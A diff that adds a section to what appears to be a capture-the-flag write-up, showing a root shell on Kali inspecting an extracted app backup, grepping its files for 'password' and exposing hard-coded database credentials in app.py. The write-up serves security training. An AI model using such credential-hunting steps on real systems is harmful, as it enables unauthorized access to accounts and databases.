@@ -210,3 +210,57 @@ cd /var/www
 ```
 
 ![image](https://github.com/user-attachments/assets/e8c11025-a6a1-4725-b56e-5e9a68e66df1)
+
+Looks like the `backupapp.zip` contains the entire `/opt/app` directory:
+
+```console
+root@kali:~/opt/app# ls -l
+total 32
+-rw-r--r-- 1 root root 11979 Sep 25 21:54 app.py
+drwxr-xr-x 3 root root  4096 Sep 30 16:16 config
+drwxr-xr-x 3 root root  4096 Sep 30 16:16 middleware
+drwxrwxr-x 2 root root  4096 Sep 30 16:16 __pycache__
+drwxr-xr-x 6 root root  4096 Sep 30 16:16 static
+drwxr-xr-x 2 root root  4096 Sep 30 16:16 templates
+```
+
+Looking for `password` in the files in this directory quickly found something:
+
+```console
+root@kali:~/opt/app# grep password ./*
+./app.py:    'password': '3wDo7gSRZIwIHRxZ!',
+./app.py:        password = request.json.get('password')
+./app.py:        password2 = hashlib.sha256(password.encode()).hexdigest()
+./app.py:        if not email or not password:
+./app.py:            return jsonify(message="email or password is missing"), 400
+./app.py:                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
+./app.py:                cursor.execute(sql, (email, password2))
+./app.py:                    return jsonify(message="Invalid email or password"), 401
+./app.py:            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
+./app.py:            if not email or not password:
+./app.py:                return jsonify(error="email or password is missing"), 400
+./app.py:                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
+./app.py:                        cursor.execute(sql, (email, password, role_id))
+grep: ./config: Is a directory
+grep: ./middleware: Is a directory
+grep: ./__pycache__: Is a directory
+grep: ./static: Is a directory
+grep: ./templates: Is a directory
+```
+
+Found: database connection credentials:
+
+```console
+root@kali:~/opt/app# cat app.py
+⋮
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'chef',
+    'password': '3wDo7gSRZIwIHRxZ!',
+    'database': 'yummy_db',
+    'cursorclass': pymysql.cursors.DictCursor,
+    'client_flag': CLIENT.MULTI_STATEMENTS
+
+}
+⋮
+```
